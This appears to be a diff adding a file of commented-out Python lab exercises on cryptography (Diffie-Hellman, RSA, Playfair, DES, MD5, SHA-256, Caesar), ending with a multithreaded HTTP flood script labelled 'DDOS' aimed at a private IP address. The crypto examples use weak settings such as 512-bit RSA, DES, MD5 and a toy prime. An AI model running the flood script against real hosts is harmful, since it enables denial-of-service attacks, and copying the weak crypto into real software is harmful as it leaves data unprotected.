@@ -1,0 +1,299 @@
+
+#Diffie Hellman
+# import random 
+
+ 
+
+# # Shared prime and base (these should be agreed upon by both parties) 
+
+# prime = 23 
+
+# base = 5 
+
+ 
+
+# # Alice's private key (randomly chosen) 
+
+# alice_private_key = random.randint(1, prime - 1) 
+
+ 
+
+# # Bob's private key (randomly chosen) 
+
+# bob_private_key = random.randint(1, prime - 1) 
+
+ 
+
+# # Calculate Alice's public key 
+
+# alice_public_key = (base ** alice_private_key) % prime 
+
+ 
+
+# # Calculate Bob's public key 
+
+# bob_public_key = (base ** bob_private_key) % prime 
+
+ 
+
+# # Exchange public keys (in practice, they share their public keys) 
+
+ 
+
+# # Calculate the shared secret key on Alice's side 
+
+# alice_shared_secret = (bob_public_key ** alice_private_key) % prime 
+
+ 
+
+# # Calculate the shared secret key on Bob's side 
+
+# bob_shared_secret = (alice_public_key ** bob_private_key) % prime 
+
+ 
+
+# # Both Alice and Bob should now have the same shared secret 
+
+# print("Shared secret on Alice's side:", alice_shared_secret) 
+
+# print("Shared secret on Bob's side:", bob_shared_secret) 
+
+
+
+ 
+
+ 
+
+ 
+
+ #RSA
+
+
+
+# import rsa
+
+# # Generate RSA key pair
+# (public_key, private_key) = rsa.newkeys(512)
+
+# # Message to encrypt
+# message = "Hello, RSA!"
+
+# # Encrypt the message
+# encrypted_message = rsa.encrypt(message.encode(), public_key)
+
+# # Decrypt the message
+# decrypted_message = rsa.decrypt(encrypted_message, private_key)
+
+# # Print the results
+# print("Original Message:", message)
+# print("Encrypted Message:", encrypted_message)
+# print("Decrypted Message:", decrypted_message.decode())
+ 
+
+
+
+#  # playfair
+# from pycipher import Playfair
+
+# # Define your key
+# key = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+
+# # Create a Playfair cipher object with the key
+# pf = Playfair(key)
+
+# # Message to encrypt
+# message = ' HELLO WORLD '
+
+# # Encrypt the message
+# encrypted_message=pf.encipher(message)
+
+# # Decrypt the message
+# decrypted_message = pf.decipher(encrypted_message)
+
+# print("Original message:", message)
+# print("Encrypted message:", encrypted_message)
+# print("Decrypted message:", decrypted_message)
+
+
+
+
+
+# #DES 
+# #pip install pyDes 
+
+ 
+
+# from pyDes import des, PAD_PKCS5 
+
+# import binascii 
+
+ 
+
+# # Key for DES (8 bytes) 
+
+# key = b'secretke' 
+
+ 
+
+# # Create a DES object 
+
+# cipher = des(key, padmode=PAD_PKCS5) 
+
+ 
+
+
+
+# # Data to encrypt 
+
+# data = b'Hello, World!' 
+
+ 
+
+# # Encrypt the data 
+
+# encrypted_data = cipher.encrypt(data) 
+
+ 
+
+# # Decrypt the data 
+
+# decrypted_data = cipher.decrypt(encrypted_data) 
+
+ 
+
+# # Print the results 
+
+# print("Original Data:", data) 
+
+# print("Encrypted Data:", binascii.hexlify(encrypted_data)) 
+
+# print("Decrypted Data:", decrypted_data.decode('utf-8')) 
+
+ 
+
+ 
+
+ 
+
+# #MD5 
+
+ 
+
+# import hashlib 
+
+ 
+
+# # Input data 
+
+# data = "Hello, World!" 
+
+ 
+
+# # Create an MD5 hash object 
+
+# md5_hash = hashlib.md5() 
+
+ 
+
+# # Update the hash object with the input data 
+
+# md5_hash.update(data.encode('utf-8')) 
+
+ 
+
+# # Get the MD5 hash in hexadecimal representation 
+
+# md5_hex = md5_hash.hexdigest() 
+
+
+
+ 
+
+# # Print the result 
+
+# print("MD5 Hash:", md5_hex) 
+
+ 
+
+ 
+
+# #SHA 
+
+# import hashlib  
+# data = "Hello, World!" 
+# sha256_hash = hashlib.sha256() 
+
+# sha256_hash.update(data.encode('utf-8')) 
+
+# sha256_hex = sha256_hash.hexdigest() 
+
+# print("SHA-256 Hash:", sha256_hex) 
+
+ 
+
+ 
+
+ 
+
+# #Caesear Cipher 
+
+
+# from secretpy import Caesar 
+
+# plaintext = "rushikesh" 
+
+# print(plaintext) 
+
+# key = 9 
+
+# cipher = Caesar() 
+
+# encr = cipher.encrypt(plaintext, key) 
+
+# print(encr) 
+
+ 
+
+# decr=cipher.decrypt(encr, key) 
+
+# print(decr)
+
+
+
+
+
+
+# #DDOS
+
+# import socket 
+# import threading 
+# target = '10.0.0.138'
+# fake_ip = '182.21.20.32'
+# port = 80 
+
+# def attack():
+#   while True:
+#     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#     s.connect((target,port))
+#     s.sendto(("GET/"+ target + " HTTP/1.1\r\n").encode('ascii'),(target,port))
+#     s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'),(target, port))
+#     s.close()
+
+# for i in range(500):
+#   thread = threading.Thread(target=attack)
+#   thread.start()
+# attack_num = 0 
+
+# def attack():
+#   while True:
+#     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#     s.connect((target, port))
+#     s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'),(target, port))
+#     s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'),(target, port))
+
+#     global attack_num
+#     attack_num += 1
+#     print(attack_num)
+
+#     s.close()
+
